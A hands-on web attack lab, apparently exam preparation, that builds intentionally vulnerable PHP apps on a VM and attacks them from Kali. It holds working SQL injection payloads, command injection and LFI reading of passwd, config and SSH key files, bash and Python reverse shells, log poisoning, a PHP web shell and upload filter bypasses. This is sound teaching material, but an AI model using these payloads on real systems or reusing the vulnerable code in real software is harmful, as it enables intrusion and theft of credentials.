# Lab: Web Attacks — Deep Dive

## Objective

Build vulnerable web applications on your Debian VM and attack them from Kali. Every step explains not just WHAT to type but WHY it works, what's happening on the server, and how to think through variations you'll see on the exam.

---

## Setup (Debian — 192.168.244.132)

```bash
sudo apt update
sudo apt install apache2 php libapache2-mod-php php-mysql mariadb-server -y
sudo systemctl enable --now apache2 mariadb

# Create the database
sudo mysql << 'SQL'
CREATE DATABASE shop;
USE shop;

CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(100),
    role VARCHAR(20),
    email VARCHAR(100)
);

INSERT INTO users VALUES (1, 'admin', 'Adm1nP@ss!', 'admin', 'admin@shop.local');
INSERT INTO users VALUES (2, 'manager', 'Manag3r!', 'manager', 'mgr@shop.local');
INSERT INTO users VALUES (3, 'dev', 'DevTest123', 'developer', 'dev@shop.local');
INSERT INTO users VALUES (4, 'svc_deploy', 'D3ploy@cc3ss', 'service', 'deploy@shop.local');
INSERT INTO users VALUES (5, 'flag_user', 'FLAG{sql_injection_mastered}', 'flag', 'flag@shop.local');

CREATE TABLE products (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(100),
    price DECIMAL(10,2),
    category VARCHAR(50)
);

INSERT INTO products VALUES (1, 'Laptop', 999.99, 'Electronics');
INSERT INTO products VALUES (2, 'Keyboard', 49.99, 'Electronics');
INSERT INTO products VALUES (3, 'Desk Chair', 299.99, 'Furniture');
INSERT INTO products VALUES (4, 'Monitor', 349.99, 'Electronics');

CREATE TABLE secret_config (
    id INT AUTO_INCREMENT PRIMARY KEY,
    setting_name VARCHAR(50),
    setting_value VARCHAR(200)
);

INSERT INTO secret_config VALUES (1, 'ssh_key_password', 'K3yP@ss2026!');
INSERT INTO secret_config VALUES (2, 'deploy_server', '172.16.0.2:22 user=deploy');
INSERT INTO secret_config VALUES (3, 'flag', 'FLAG{hidden_table_discovered}');

GRANT ALL ON shop.* TO 'shopuser'@'localhost' IDENTIFIED BY 'shopdbpass';
GRANT FILE ON *.* TO 'shopuser'@'localhost';
FLUSH PRIVILEGES;
SQL

# Landing page
cat << 'EOF' | sudo tee /var/www/html/index.html
<html><head><title>Shop Portal</title></head>
<body>
<h1>Welcome to the Shop</h1>
<ul>
    <li><a href="/shop/login.php">Staff Login</a></li>
    <li><a href="/shop/products.php">Product Search</a></li>
</ul>
<!-- NOTE: diagnostic tools moved to /diag/ -->
<!-- TODO: remove /includes/config.php.bak before go-live -->
</body></html>
EOF
```

Now build each vulnerable application:

```bash
sudo mkdir -p /var/www/html/{shop,diag,upload/files,pages}

# ========== SQL INJECTION — Login (Auth Bypass) ==========
cat << 'PHPEOF' | sudo tee /var/www/html/shop/login.php
<?php
$conn = new mysqli("localhost","shopuser","shopdbpass","shop");
$msg = "";
if(isset($_POST['user']) && isset($_POST['pass'])) {
    $u = $_POST['user'];
    $p = $_POST['pass'];
    $q = "SELECT * FROM users WHERE username='$u' AND password='$p'";
    $r = $conn->query($q);
    if($r && $row = $r->fetch_assoc()) {
        $msg = "<div style='background:#d4edda;padding:15px;margin:10px 0'>
                <h2>Welcome, {$row['username']}!</h2>
                <p>Role: {$row['role']}</p><p>Email: {$row['email']}</p>
                <p>Query that ran: <code>$q</code></p></div>";
    } else {
        $msg = "<div style='background:#f8d7da;padding:15px;margin:10px 0'>
                <p>Invalid credentials.</p>
                <p>Query that ran: <code>$q</code></p></div>";
        if($conn->error) $msg .= "<p style='color:red'>SQL Error: {$conn->error}</p>";
    }
}
?>
<html><body>
<h1>Staff Login</h1>
<form method="POST">
Username: <input name="user" size="30"><br><br>
Password: <input type="password" name="pass" size="30"><br><br>
<button type="submit">Login</button>
</form>
<?php echo $msg; ?>
<p><a href="products.php">Product Search →</a></p>
</body></html>
PHPEOF

# ========== SQL INJECTION — Search (UNION Extraction) ==========
cat << 'PHPEOF' | sudo tee /var/www/html/shop/products.php
<?php
$conn = new mysqli("localhost","shopuser","shopdbpass","shop");
$results = "";
if(isset($_GET['id'])) {
    $id = $_GET['id'];
    $q = "SELECT id, name, price FROM products WHERE id=$id";
    $r = $conn->query($q);
    if($r && $r->num_rows > 0) {
        $results = "<table border='1' cellpadding='8'><tr><th>ID</th><th>Product</th><th>Price</th></tr>";
        while($row = $r->fetch_assoc()) {
            $results .= "<tr><td>{$row['id']}</td><td>{$row['name']}</td><td>\${$row['price']}</td></tr>";
        }
        $results .= "</table>";
    } else {
        $results = "<p>No product found.</p>";
        if($conn->error) $results .= "<p style='color:red'>SQL Error: {$conn->error}</p>";
    }
    $results .= "<p><small>Query: <code>$q</code></small></p>";
}
?>
<html><body>
<h1>Product Search</h1>
<form method="GET">
Product ID: <input name="id" size="10" value="<?php echo htmlspecialchars($_GET['id'] ?? ''); ?>">
<button type="submit">Search</button>
</form>
<?php echo $results; ?>
<p><a href="login.php">← Staff Login</a></p>
</body></html>
PHPEOF

# ========== COMMAND INJECTION ==========
cat << 'PHPEOF' | sudo tee /var/www/html/diag/index.php
<?php $output = "";
if(isset($_GET['host'])) {
    $host = $_GET['host'];
    $output = shell_exec("ping -c 2 " . $host . " 2>&1");
}
?>
<html><body>
<h1>Network Diagnostics</h1>
<form method="GET">
Host to ping: <input name="host" size="30" value="<?php echo htmlspecialchars($_GET['host'] ?? ''); ?>">
<button type="submit">Run Diagnostic</button>
</form>
<?php if($output): ?>
<h2>Output:</h2>
<pre><?php echo htmlspecialchars($output); ?></pre>
<?php endif; ?>
</body></html>
PHPEOF

# ========== LOCAL FILE INCLUSION ==========
echo "<h1>About Us</h1><p>We are a technology company founded in 2020.</p>" | sudo tee /var/www/html/pages/about.php
echo "<h1>Services</h1><p>We offer consulting, development, and hosting.</p>" | sudo tee /var/www/html/pages/services.php
echo "<h1>Contact</h1><p>Email: info@shop.local | Phone: 555-0100</p>" | sudo tee /var/www/html/pages/contact.php

cat << 'PHPEOF' | sudo tee /var/www/html/pages/index.php
<?php $page = isset($_GET['page']) ? $_GET['page'] : null; ?>
<html><body>
<h1>Company Info</h1>
<nav><a href="?page=about.php">About</a> | <a href="?page=services.php">Services</a> | <a href="?page=contact.php">Contact</a></nav>
<hr>
<?php if($page) { include($page); } else { echo "<p>Select a page above.</p>"; } ?>
</body></html>
PHPEOF

# ========== FILE UPLOAD ==========
sudo chmod 777 /var/www/html/upload/files

cat << 'PHPEOF' | sudo tee /var/www/html/upload/index.php
<?php
$msg = "";
if(isset($_FILES['file'])) {
    $name = $_FILES['file']['name'];
    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    $blocked = ['exe','bat','cmd','msi'];
    if(in_array($ext, $blocked)) {
        $msg = "<p style='color:red'>File type .$ext is not allowed!</p>";
    } else {
        $target = "/var/www/html/upload/files/" . basename($name);
        if(move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
            $msg = "<p style='color:green'>Uploaded: <a href='files/$name'>files/$name</a></p>";
        } else { $msg = "<p style='color:red'>Upload failed.</p>"; }
    }
}
?>
<html><body>
<h1>Document Upload Portal</h1>
<p>Allowed: PDF, DOC, TXT, images. Blocked: EXE, BAT, CMD, MSI.</p>
<form method="POST" enctype="multipart/form-data">
<input type="file" name="file"> <button type="submit">Upload</button>
</form>
<?php echo $msg; ?>
</body></html>
PHPEOF

# ========== CONFIG BACKUP (leaked) ==========
sudo mkdir -p /var/www/html/includes
cat << 'PHPEOF' | sudo tee /var/www/html/includes/config.php.bak
<?php
// Database configuration
$db_host = "localhost";
$db_user = "shopuser";
$db_pass = "shopdbpass";
$db_name = "shop";

// Application settings
$admin_email = "admin@shop.local";
$debug_mode = true;
$api_key = "sk_live_FLAG{config_backup_exposed}";
$ssh_deploy_key = "/opt/keys/deploy_rsa";

// Internal hosts
$deploy_server = "172.16.0.2";
$monitor_server = "192.168.244.131";
?>
PHPEOF

# Sensitive file for LFI practice
sudo mkdir -p /home/webadmin/.ssh
echo "-----BEGIN OPENSSH PRIVATE KEY-----" | sudo tee /home/webadmin/.ssh/id_rsa
echo "FLAG{lfi_ssh_key_extracted}" | sudo tee -a /home/webadmin/.ssh/id_rsa
echo "-----END OPENSSH PRIVATE KEY-----" | sudo tee -a /home/webadmin/.ssh/id_rsa

sudo iptables -F && sudo iptables -P INPUT ACCEPT
echo "Setup complete."
```

---

## Attack 1: SQL Injection — Authentication Bypass

### Understanding the vulnerability

Open the login page source on Kali:

```bash
curl -s http://192.168.244.132/shop/login.php
```

The form sends `user` and `pass` via POST. On the server, the PHP code builds a query by pasting your input directly into SQL:

```php
$q = "SELECT * FROM users WHERE username='$u' AND password='$p'";
```

If you type `admin` and `wrongpass`, the query becomes:

```sql
SELECT * FROM users WHERE username='admin' AND password='wrongpass'
```

This returns zero rows → login fails. But what if your input contains SQL syntax?

### Step 1: Confirm SQL injection exists

```bash
curl -X POST http://192.168.244.132/shop/login.php -d "user=admin'&pass=test"
```

**Why the single quote matters:** Your input `admin'` creates this query:

```sql
SELECT * FROM users WHERE username='admin'' AND password='test'
```

There's an extra quote. SQL can't parse this → **error message appears**. An error from a quote proves the input goes directly into SQL without sanitization.

### Step 2: Bypass the login — OR 1=1

```bash
curl -X POST http://192.168.244.132/shop/login.php -d "user=' OR 1=1-- -&pass=anything"
```

**What the server builds:**

```sql
SELECT * FROM users WHERE username='' OR 1=1-- -' AND password='anything'
```

**Breaking this apart:**

```
username=''           ← empty username (no match)
OR 1=1                ← BUT 1 always equals 1, so this is ALWAYS TRUE
-- -                  ← comment delimiter — everything after this is ignored
' AND password='...'  ← this part is commented out, never executed
```

The query returns ALL rows because `OR 1=1` is always true. The application takes the first row (admin) and logs you in.

**The `-- -` at the end:** The double dash `--` starts a SQL comment. MySQL requires a space after `--` for it to work as a comment. Adding `-` after the space ensures the space isn't stripped by the application.

### Step 3: Login as a SPECIFIC user

```bash
curl -X POST http://192.168.244.132/shop/login.php -d "user=admin'-- -&pass=anything"
```

**The query becomes:**

```sql
SELECT * FROM users WHERE username='admin'-- -' AND password='anything'
```

The `'` after admin closes the username string. `-- -` comments out the password check entirely. The query only checks the username, which matches admin.

**Try logging in as each user:**

```bash
curl -X POST http://192.168.244.132/shop/login.php -d "user=manager'-- -&pass=x"
curl -X POST http://192.168.244.132/shop/login.php -d "user=dev'-- -&pass=x"
curl -X POST http://192.168.244.132/shop/login.php -d "user=svc_deploy'-- -&pass=x"
```

Each one logs you in as that user without knowing their password.

---

## Attack 2: SQL Injection — UNION-Based Data Extraction

### Understanding UNION injection

The product search page builds a query like:

```sql
SELECT id, name, price FROM products WHERE id=YOUR_INPUT
```

The page displays the result in a table. UNION injection appends a second SELECT query to the original, and the results appear in the same table.

### Step 1: Confirm injection

```bash
curl "http://192.168.244.132/shop/products.php?id=1"
# Shows: Laptop, $999.99 — normal behavior

curl "http://192.168.244.132/shop/products.php?id=1'"
# Shows: SQL Error — confirms injection (the quote broke the query)
```

### Step 2: Find the column count

UNION requires both SELECT statements to have the **same number of columns**. You find the count using ORDER BY:

```bash
curl "http://192.168.244.132/shop/products.php?id=1%20ORDER%20BY%201"    # works
curl "http://192.168.244.132/shop/products.php?id=1%20ORDER$20BY%202"    # works
curl "http://192.168.244.132/shop/products.php?id=1%20ORDER$20BY%203"    # works
curl "http://192.168.244.132/shop/products.php?id=1%20ORDER%20BY%204"    # error!

# You need to do %20 for every white space because spaces break curl.
```

**How ORDER BY works here:** `ORDER BY 1` sorts results by the first column. If the query has 3 columns, `ORDER BY 4` fails because there's no 4th column. So there are **3 columns**.

### Step 3: Find which columns are displayed

```bash
curl "http://192.168.244.132/shop/products.php?id=-1 UNION SELECT 1,2,3"
```

**Why `id=-1`:** Using a negative ID ensures the first SELECT returns no rows (no product has ID -1). This way, ONLY your UNION SELECT results are displayed, making the output cleaner.

**The response shows:** `1`, `2`, `3` in the table cells. This tells you which column positions appear where in the output. Typically column 2 (name field) is a good place to put extracted data because it's a text field with space.

### Step 4: Extract database information

```bash
# Database version
curl "http://192.168.244.132/shop/products.php?id=-1 UNION SELECT 1,@@version,3"
# Shows: 10.11.6-MariaDB-0+deb12u1

# Current database name
curl "http://192.168.244.132/shop/products.php?id=-1 UNION SELECT 1,database(),3"
# Shows: shop

# Current user
curl "http://192.168.244.132/shop/products.php?id=-1 UNION SELECT 1,user(),3"
# Shows: shopuser@localhost
```

**What these functions do:**
- `@@version` — built-in variable that returns the MySQL/MariaDB version
- `database()` — returns the name of the current database
- `user()` — returns the database user the application connects as

### Step 5: List all tables

```bash
curl "http://192.168.244.132/shop/products.php?id=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='shop'"
```

**Breaking this down:**

```
information_schema.tables    ← MySQL's metadata database — contains info about all tables
table_schema='shop'          ← filter to only the 'shop' database
GROUP_CONCAT(table_name)     ← combine all table names into one comma-separated string
```

**Result:** `products,secret_config,users`

You now know every table in the database. `secret_config` looks interesting.

### Step 6: List columns in a table

```bash
# Columns in the users table
curl "http://192.168.244.132/shop/products.php?id=-1 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'"
# Result: id,username,password,role,email

# Columns in secret_config
curl "http://192.168.244.132/shop/products.php?id=-1 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='secret_config'"
# Result: id,setting_name,setting_value
```

### Step 7: Extract all data

```bash
# All usernames and passwords
curl "http://192.168.244.132/shop/products.php?id=-1 UNION SELECT 1,GROUP_CONCAT(username,':',password SEPARATOR '<br>'),3 FROM users"
# Result:
# admin:Adm1nP@ss!
# manager:Manag3r!
# dev:DevTest123
# svc_deploy:D3ploy@cc3ss
# flag_user:FLAG{sql_injection_mastered}

# All secrets
curl "http://192.168.244.132/shop/products.php?id=-1 UNION SELECT 1,GROUP_CONCAT(setting_name,':',setting_value SEPARATOR '<br>'),3 FROM secret_config"
# Result:
# ssh_key_password:K3yP@ss2026!
# deploy_server:172.16.0.2:22 user=deploy
# flag:FLAG{hidden_table_discovered}
```

### Step 8: Read files from the filesystem

```bash
curl "http://192.168.244.132/shop/products.php?id=-1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3"
# Returns the contents of /etc/passwd

curl "http://192.168.244.132/shop/products.php?id=-1 UNION SELECT 1,LOAD_FILE('/var/www/html/includes/config.php.bak'),3"
# Returns the config file with API keys and internal IPs
```

**Why LOAD_FILE works:** The database user (`shopuser`) was granted `FILE` privilege. This lets MySQL read files from the server's filesystem. Not every setup has this — but when it does, you can read anything the MySQL process can access.

---

## Attack 3: Command Injection

### Understanding the vulnerability

Browse to `http://192.168.244.132/diag/` and look at the source. The PHP code runs:

```php
$output = shell_exec("ping -c 2 " . $host);
```

Your input is concatenated directly into a shell command. If you input `127.0.0.1`, the server runs:

```bash
ping -c 2 127.0.0.1
```

But shell metacharacters let you run ADDITIONAL commands:

### Step 1: Test injection characters

```bash
# Semicolon — runs a second command after the first
curl "http://192.168.244.132/diag/?host=127.0.0.1;id"
# Server runs: ping -c 2 127.0.0.1; id
# The ; means "run this command, THEN run the next command"
# You see ping output followed by: uid=33(www-data) gid=33(www-data)

# Pipe — sends the first command's output to the second
curl "http://192.168.244.132/diag/?host=127.0.0.1|id"
# Server runs: ping -c 2 127.0.0.1 | id
# The | pipes ping's output to id (id ignores it and just runs)

# AND — runs the second command only if the first succeeds
curl "http://192.168.244.132/diag/?host=127.0.0.1%26%26id"
# Server runs: ping -c 2 127.0.0.1 && id
# Note: & must be URL-encoded as %26 (because & has meaning in URLs)

# Command substitution — runs the inner command first
curl "http://192.168.244.132/diag/?host=\$(whoami)"
# Server runs: ping -c 2 $(whoami)
# $(whoami) runs first, returns "www-data"
# Then: ping -c 2 www-data (which fails, but the command executed)
```

### Step 2: Enumerate the system

```bash
curl "http://192.168.244.132/diag/?host=127.0.0.1;cat+/etc/passwd"
# The + is URL encoding for a space
# Server runs: ping -c 2 127.0.0.1; cat /etc/passwd

curl "http://192.168.244.132/diag/?host=127.0.0.1;ls+-la+/home"
curl "http://192.168.244.132/diag/?host=127.0.0.1;cat+/home/webadmin/.ssh/id_rsa"
curl "http://192.168.244.132/diag/?host=127.0.0.1;cat+/var/www/html/includes/config.php.bak"
```

### Step 3: Get a reverse shell

```bash
# On Kali — start listener
nc -lvnp 4444

# Send the reverse shell payload
curl "http://192.168.244.132/diag/?host=127.0.0.1;bash+-c+'bash+-i+>%26+/dev/tcp/192.168.244.129/4444+0>%261'"
```

**Why the encoding matters:**

```
Original: bash -c 'bash -i >& /dev/tcp/KALI/4444 0>&1'

URL encoded:
  spaces  → +
  &       → %26  (literal ampersand, not URL parameter separator)
  '       → +    (surrounded by + as word separators)
```

If the reverse shell doesn't work, try other payloads:

```bash
# URL-encoded Python reverse shell
curl "http://192.168.244.132/diag/?host=127.0.0.1;python3+-c+'import+socket,subprocess,os;s=socket.socket();s.connect((\"192.168.244.129\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"

# Or write a script and execute it
curl "http://192.168.244.132/diag/?host=127.0.0.1;echo+'bash+-i+>%26+/dev/tcp/192.168.244.129/4444+0>%261'+>+/tmp/rev.sh;bash+/tmp/rev.sh"
```

---

## Attack 4: Local File Inclusion (LFI)

### Understanding the vulnerability

Browse to `http://192.168.244.132/pages/?page=about.php`. The PHP code runs:

```php
include($page);   // includes whatever file the user specifies
```

When `page=about.php`, it includes `/var/www/html/pages/about.php`. But there's no restriction on which file you include.

### Step 1: Basic path traversal

```bash
curl "http://192.168.244.132/pages/?page=../../../../etc/passwd"
```

**How path traversal works:**

```
Starting directory: /var/www/html/pages/
../../               goes up to /var/www/html/
../../../            goes up to /var/www/
../../../../         goes up to /var/
../../../../../      goes up to / (the root)
../../../../etc/passwd  → /etc/passwd
```

Each `../` goes up one directory. Even if you add too many `../`, you can't go above `/` (the root), so extra ones don't hurt.

### Step 2: Read sensitive files

```bash
# System files
curl "http://192.168.244.132/pages/?page=../../../../etc/passwd"
curl "http://192.168.244.132/pages/?page=../../../../etc/shadow"
# Shadow usually fails (www-data can't read it)

# Application config
curl "http://192.168.244.132/pages/?page=../includes/config.php.bak"
# Works! .bak files are served as plaintext

# But config.php WON'T show source code — PHP executes it instead of displaying it
curl "http://192.168.244.132/pages/?page=../includes/config.php"
# Shows empty or partial output (PHP was executed, not displayed)

# SSH keys
curl "http://192.168.244.132/pages/?page=../../../../home/webadmin/.ssh/id_rsa"
```

### Step 3: Read PHP source code with php://filter

The `php://filter` wrapper lets you read PHP files as BASE64 instead of executing them:

```bash
curl "http://192.168.244.132/pages/?page=php://filter/convert.base64-encode/resource=../shop/login.php"
```

**What this does:**

```
php://filter                    ← PHP stream wrapper (built-in)
convert.base64-encode           ← encode the file as base64 before including it
resource=../shop/login.php      ← the file to read
```

Instead of executing login.php, PHP encodes it to base64 and outputs the encoded string. Decode it on Kali:

```bash
echo "THE_BASE64_OUTPUT" | base64 -d
```

Now you see the raw PHP source code — including database credentials, SQL queries, and application logic.

### Step 4: Log poisoning for RCE

LFI can read files but can't execute commands directly. **Log poisoning** turns LFI into RCE by injecting PHP code into a log file, then including that log file.

**Step 4a: Inject PHP into the Apache access log**

```bash
curl http://192.168.244.132/ -A "<?php system(\$_GET['cmd']); ?>"
```

**What this does:** The `-A` flag sets the User-Agent header. Apache logs every request including the User-Agent to `/var/log/apache2/access.log`. Now the log file contains your PHP code:

```
192.168.244.129 - - [31/Jul/2026:...] "GET / HTTP/1.1" 200 ... "<?php system($_GET['cmd']); ?>"
```

**Step 4b: Include the log file with a command**

```bash
curl "http://192.168.244.132/pages/?page=../../../../var/log/apache2/access.log&cmd=whoami"
```

**What happens:**
1. PHP includes `/var/log/apache2/access.log`
2. The log file contains your `<?php system($_GET['cmd']); ?>`
3. PHP executes that code with `$_GET['cmd']` = `whoami`
4. You see `www-data` in the output

**Step 4c: Get a reverse shell through the poisoned log**

```bash
# Start listener on Kali
nc -lvnp 4444

# Trigger the reverse shell
curl "http://192.168.244.132/pages/?page=../../../../var/log/apache2/access.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.244.129/4444+0>%261'"
```

---

## Attack 5: File Upload Bypass

### Understanding the filter

The upload page blocks `.exe`, `.bat`, `.cmd`, `.msi` extensions. But it does NOT block `.php`.

### Step 1: Upload a PHP web shell directly

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php

curl -F "file=@shell.php" http://192.168.244.132/upload/
# Response: Uploaded: files/shell.php

# Execute commands
curl "http://192.168.244.132/upload/files/shell.php?cmd=whoami"
# www-data

curl "http://192.168.244.132/upload/files/shell.php?cmd=id"
curl "http://192.168.244.132/upload/files/shell.php?cmd=cat+/etc/passwd"
```

### Step 2: Use the web shell to access the database

```bash
curl "http://192.168.244.132/upload/files/shell.php?cmd=mysql+-u+shopuser+-pshopdbpass+-e+'SELECT+*+FROM+shop.users'"
curl "http://192.168.244.132/upload/files/shell.php?cmd=mysql+-u+shopuser+-pshopdbpass+-e+'SELECT+*+FROM+shop.secret_config'"
```

### Step 3: Upgrade to a reverse shell

```bash
# On Kali
nc -lvnp 4444

# Through the web shell
curl "http://192.168.244.132/upload/files/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.244.129/4444+0>%261'"
```

### Step 4: What if .php was blocked?

Common bypass techniques for real-world and exam scenarios:

```bash
# Alternative PHP extensions (Apache might execute these too)
shell.php3
shell.php4
shell.php5
shell.phtml
shell.phar

# Double extension
shell.php.jpg          # some filters only check the last extension
shell.jpg.php          # some filters only check the first extension

# Null byte (old PHP versions < 5.3.4)
shell.php%00.jpg       # PHP sees .php, filter sees .jpg

# Case manipulation
shell.pHp
shell.PHP
```

---

## Chaining Everything Together

A real attack chain combines multiple vulnerabilities:

```
1. Read HTML source → find /diag/ comment and /includes/config.php.bak
2. Read config.php.bak → get database credentials and internal server IPs
3. SQLi on products.php → extract all users, passwords, and secret_config
4. svc_deploy credentials from DB → try on SSH
5. Command injection on /diag/ → reverse shell as www-data
6. Upload web shell on /upload/ → persistent access
7. Found credentials → try on SSH, other machines, internal network
```

---

## Cleanup

```bash
sudo mysql -e "DROP DATABASE shop; DROP USER 'shopuser'@'localhost';"
sudo rm -rf /var/www/html/{shop,diag,upload,pages,includes}
sudo rm -rf /home/webadmin
echo "<h1>It works!</h1>" | sudo tee /var/www/html/index.html
```
